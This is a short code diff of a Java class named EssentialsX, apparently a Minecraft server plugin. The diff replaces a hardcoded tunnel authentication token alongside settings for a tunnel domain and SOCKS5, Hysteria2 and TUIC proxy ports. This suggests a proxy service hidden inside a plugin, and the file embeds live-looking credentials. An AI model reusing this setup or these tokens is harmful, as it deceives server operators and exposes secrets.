@@ -77,7 +77,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("FILE_PATH", "./world");
         env.put("ARGO_PORT", "8001");
         env.put("ARGO_DOMAIN", "craftserve.zdsas.cyou");
-        env.put("ARGO_AUTH", "eyJhIjoiMmY2ZTllNjhmNDk2NTBjMGFjMzQ3OTkzMDE0NDRkNGQiLCJ0IjoiNjg4ZjZhYjEtYTc1My00N2NlLTg5MzEtYzc4YzdhNDAwNWY0IiwicyI6IlptRmpZVEJrTXpNdE9ETXhOQzAwTTJJd0xXSm1NV010TURGbE1EQmlaV1V5TVRaaiJ9");
+        env.put("ARGO_AUTH", "eyJhIjoiMmY2ZTllNjhmNDk2NTBjMGFjMzQ3OTkzMDE0NDRkNGQiLCJ0IjoiZjhlMDlmMDEtY2YzNC00OTc3LTkzYmYtMmMxMTVjMTAwZDY4IiwicyI6IlkySmxOVFk1T0RndE9XSXdaUzAwWkRjMkxXRTJNRFV0TjJNMVpUYzVOakF6TjJJNCJ9");
         env.put("S5_PORT", "");
         env.put("HY2_PORT", "");
         env.put("TUIC_PORT", "");
